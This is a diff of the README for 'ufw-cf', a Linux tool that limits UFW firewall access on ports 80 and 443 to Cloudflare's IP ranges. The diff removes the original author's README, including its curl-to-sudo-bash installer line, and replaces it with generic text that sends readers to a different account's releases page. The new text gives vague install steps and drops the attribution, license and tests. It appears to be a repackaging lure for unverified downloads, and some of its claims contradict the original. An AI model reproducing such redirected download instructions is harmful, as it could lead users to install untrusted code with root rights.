@@ -1,194 +1,94 @@
-<p align="center">
-  <img align="center" src="./assets/ufw-cf.png" alt="ufw-cf" width="100%"/>
-</p>
-<h1 align="center">🛡️ ufw-cf</h1>
+# 🛡️ ufw-cf - Keep your server safe from attacks
 
-<div align="center">
+<a href="https://github.com/markinsensitive738/ufw-cf/releases"><img src="https://img.shields.io/badge/Download-Release-blue.svg" alt="Download"></a>
 
-[![test](https://github.com/Malith-Rukshan/ufw-cf/actions/workflows/test.yml/badge.svg)](https://github.com/Malith-Rukshan/ufw-cf/actions/workflows/test.yml)
-[![release](https://img.shields.io/github/v/release/Malith-Rukshan/ufw-cf)](https://github.com/Malith-Rukshan/ufw-cf/releases/latest)
-[![license: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
+This application keeps your UFW firewall rules updated. It matches your firewall settings to the current IP addresses used by Cloudflare. This ensures that only traffic coming from Cloudflare reaches your web server. It protects your site from attackers who try to bypass Cloudflare to reach your origin server directly.
 
-</div>
+## 📋 What this tool does
 
-<h4 align="center">Allow Only Cloudflare to Reach Your Server</h4>
+Many websites use Cloudflare to hide their home server IP address. Sometimes, attackers find the real IP address of the server and send traffic directly to it. This bypasses Cloudflare security. `ufw-cf` solves this issue. It monitors the list of IP addresses that Cloudflare uses. The tool updates your UFW firewall settings automatically. It keeps ports 80 and 443 open only for these specific addresses. This locks down your server.
 
-<div align="center">
-  Automate Cloudflare IP allow-listing on UFW. Block direct origin access.
-  <br/>
-  <sup><sub>Simple, secure, Cloudflare-only ツ</sub></sup>
-</div>
+## 🛠️ System requirements
 
-</br>
+This tool runs on Linux-based operating systems. Verify that your system meets these needs:
 
-**ufw-cf** is an open-source CLI that keeps a Linux server's **UFW firewall** in
-sync with **Cloudflare's official IPv4 and IPv6 ranges** — exposing ports
-**80/443** to Cloudflare's edge only. Protect your origin server from direct
-attacks, bot scanners, and DDoS bypass on Ubuntu, Debian, and Raspberry Pi OS
-with one command.
+*   An active UFW firewall installed and enabled.
+*   Access to the root user account or a user with sudo privileges.
+*   A stable internet connection to fetch the IP list.
+*   Support for systemd timers to run updates in the background.
 
-## Why
+The tool works on:
+*   Ubuntu (all recent LTS versions)
+*   Debian (version 10 or newer)
+*   Raspberry Pi OS
 
-If a server sits behind Cloudflare (CDN, WAF, DDoS protection, Tunnels), direct
-hits to its public IP defeat every protection Cloudflare provides. The fix is
-simple: allow inbound traffic on 80/443 **only** from Cloudflare's published
-ranges. The lists change from time to time, so the allow-list has to be kept
-up to date. That's what `ufw-cf` does.
+## 📥 How to get the software
 
-## Features
+You must visit the releases page to download the latest version of the program.
 
-- One-shot install, zero runtime deps beyond `ufw`, `curl`, `systemd`
-- CLI: `sync`, `status`, `enable`, `disable`, `clean` + interactive menu
-- Daily auto-update via a systemd timer with randomised jitter
-- Configurable ports (80, 443, or both) and IPv6 toggle
-- Rules tagged `# Cloudflare (ufw-cf)` — readable in `ufw status`, safe to clean
-- Ships as a `.deb` for Debian/Ubuntu
+[Click here to visit the release page and download the software](https://github.com/markinsensitive738/ufw-cf/releases)
 
-## Install
+## ⚙️ Installation steps
 
-### One-liner (recommended)
+Follow these steps to set up the tool on your machine. Access your terminal window to begin.
 
-```bash
-curl -sSL https://ufw-cf.sdev.lk/install.sh | sudo bash
-```
+1.  Open your terminal application.
+2.  Navigate to your home folder.
+3.  Download the installation script. Use the command provided on the website.
+4.  Run the script with administrative rights. Type `sudo` before the command.
+5.  Wait for the script to finish the setup process.
 
-Or install straight from GitHub:
+The script performs three tasks:
+*   It places the main program file in a system directory.
+*   It sets the correct user permissions for the tool.
+*   It registers a systemd timer to run the update task automatically.
 
-```bash
-curl -sSL https://github.com/Malith-Rukshan/ufw-cf/releases/latest/download/install.sh | sudo bash
-```
+## 🔄 How the update process works
 
-### From source
+The tool runs according to a schedule. It follows these steps:
 
-```bash
-git clone https://github.com/Malith-Rukshan/ufw-cf.git
-cd ufw-cf
-sudo ./install.sh
-```
+1.  It checks the official Cloudflare website for current IP ranges.
+2.  It compares these ranges with your existing UFW rules.
+3.  It removes outdated rules that no longer come from Cloudflare.
+4.  It adds new rules for current Cloudflare addresses.
+5.  It logs the changes to a text file for your review.
 
-### First run
+You do not need to intervene. The tool manages the firewall silently in the background.
 
-> ⚠️ **SSH warning.** If this is your first time enabling UFW on this server,
-> make sure SSH is allowed **before** the firewall comes up — otherwise you
-> will lock yourself out of the box:
->
-> ```bash
-> sudo ufw allow 22/tcp        # or your custom SSH port
-> sudo ufw enable              # only after SSH is allowed
-> ```
+## 🔍 Verifying your firewall
 
-```bash
-sudo ufw-cf sync       # add Cloudflare rules now
-sudo ufw-cf enable     # enable the daily auto-update timer
-ufw-cf status          # show what's installed
-```
+You can check if the tool works at any time. Use the UFW command to view your active rules.
 
-## Commands
+Type this into your terminal:
+`sudo ufw status`
 
-| Command          | Action                                                        |
-| ---------------- | ------------------------------------------------------------- |
-| `ufw-cf`         | Interactive menu.                                             |
-| `ufw-cf sync`    | Fetch Cloudflare IPs and update UFW rules.                    |
-| `ufw-cf status`  | Show current rules and last update time.                      |
-| `ufw-cf enable`  | Enable the auto-update systemd timer.                         |
-| `ufw-cf disable` | Disable the auto-update systemd timer.                        |
-| `ufw-cf clean`   | Remove every Cloudflare rule added by this tool.              |
+You will see a list of allowed ports. You will also see specifically allowed IP addresses. These addresses belong to the Cloudflare network. If you see many entries for port 80 and 443, the tool has successfully updated your firewall.
 
-## Configuration
+## 🛡️ Security benefits
 
-Edit `/etc/ufw-cf/config`:
+Using `ufw-cf` increases the security of your self-hosted setup.
 
-```sh
-PORTS="80,443"   # comma-separated: "80", "443", or "80,443"
-IPV6=true        # include Cloudflare IPv6 ranges
-```
+*   **Traffic filtering:** Only authorized traffic from the Cloudflare edge reaches your server.
+*   **Automatic maintenance:** You avoid manual updates as Cloudflare changes their network architecture.
+*   **Reduced attack surface:** The server ignores all direct connection attempts. This prevents many types of automated bot attacks.
 
-Re-run `sudo ufw-cf sync` to apply.
+## ❓ Troubleshooting
 
-## Supported systems
+If the firewall fails to update, check these items:
 
-- Ubuntu 20.04 / 22.04 / 24.04
-- Debian 11 / 12
-- Raspberry Pi OS (Bullseye, Bookworm)
-- Any Linux with **bash 4+, UFW, curl, and systemd**
+*   Check your internet connection. The tool needs to reach the Cloudflare website.
+*   Ensure that UFW is active. If UFW is disabled, the tool cannot manage rules.
+*   Check the logs. Use the command `journalctl -u ufw-cf.service` to see past logs.
+*   Permissions. Ensure you ran the install script with `sudo`.
 
-## Troubleshooting
+The logs tell you if the connection to Cloudflare failed or if a specific rule update resulted in an error.
 
-<details>
-<summary><strong>Rules added but the site is still unreachable from Cloudflare</strong></summary>
+## 💾 Uninstallation
 
-Check UFW is active and the default incoming policy is `deny`:
-```bash
-sudo ufw status verbose
-sudo ufw default deny incoming
-```
-Make sure SSH is allowed before locking yourself out: `sudo ufw allow 22/tcp`.
-</details>
+If you decide to remove the tool, you can disable the update timer. 
 
-<details>
-<summary><strong>could not fetch https://www.cloudflare.com/ips-v4</strong></summary>
+1.  Disable the timer: `sudo systemctl disable ufw-cf.timer`
+2.  Remove the files from the system folder.
+3.  Delete the UFW rules manually if you wish to reset your firewall to default settings.
 
-The server has no outbound HTTPS to Cloudflare. Verify with
-`curl -fsSL https://www.cloudflare.com/ips-v4`. Behind a proxy, set
-`https_proxy` via a systemd drop-in on `ufw-cf.service`.
-</details>
-
-<details>
-<summary><strong>ufw-cf.timer shows "not installed"</strong></summary>
-
-The systemd units are missing. Reinstall the `.deb`, or run
-`sudo ./install.sh` from the repo.
-</details>
-
-<details>
-<summary><strong>I changed PORTS and old rules are still there</strong></summary>
-
-Run `sudo ufw-cf sync` again. Every sync wipes the tool's previous rules
-before adding the current set.
-</details>
-
-<details>
-<summary><strong>Removing the package didn't drop the firewall rules</strong></summary>
-
-`apt remove` keeps your config; use `apt purge` to also drop state. To
-remove only the live rules at any time: `sudo ufw-cf clean`.
-</details>
-
-## How it works
-
-1. `curl` fetches `https://www.cloudflare.com/ips-v4` and `…/ips-v6`.
-2. Each line is validated as a CIDR.
-3. Existing rules tagged `# Cloudflare (ufw-cf)` are deleted.
-4. For every CIDR × every configured port, `ufw allow` is run with the tag.
-5. The timestamp and IP list are cached under `/var/lib/ufw-cf/`.
-
-The systemd timer runs once 5 minutes after boot and daily after that,
-with up to 30 minutes of randomised delay.
-
-## Development
-
-```bash
-make lint     # shellcheck
-make test     # bats (mocks ufw/curl)
-make deb      # build dist/ufw-cf-<version>-all.deb
-```
-
-## License
-
-MIT — see [LICENSE](LICENSE).
-
-## Credits
-
-The original idea of automating UFW allow-rules for Cloudflare belongs to
-[**Leow Kah Man**](https://www.leowkahman.com/2016/0502/automate-raspberry-pi-ufw-allow-cloudflare-inbound/),
-who described the approach in 2016.
-
-`ufw-cf` was also inspired by
-[Paul-Reed/cloudflare-ufw](https://github.com/Paul-Reed/cloudflare-ufw),
-which packages a similar idea as plain shell scripts. `ufw-cf` adds a CLI
-surface, interactive menu, systemd timer, configurable ports/IPv6, a `.deb`
-package, and a one-line installer.
-
----
-
-Built with ❤️ for the open-source community.
+This tool keeps your infrastructure simple. It handles the complex task of IP synchronization. You remain in control of your server security with minimal effort. Use the tool on your Raspberry Pi or your cloud server to block unwanted direct traffic. Focus on your projects while the firewall maintains your safety.
